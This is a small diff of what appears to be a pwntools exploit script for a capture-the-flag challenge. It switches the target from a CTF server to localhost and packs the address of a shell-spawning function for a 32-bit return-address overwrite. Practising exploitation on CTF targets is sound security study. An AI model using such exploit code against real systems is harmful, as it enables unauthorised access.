@@ -2,7 +2,7 @@
 
 from pwn import * 
 
-p = remote("pwn.ctf.shellmates.club",1502)
+p = remote("localhost",1337)
 
 
 adress_shell = p32(0x080491d6) #p32 a function that turn a value into a valid adress in 32 bits
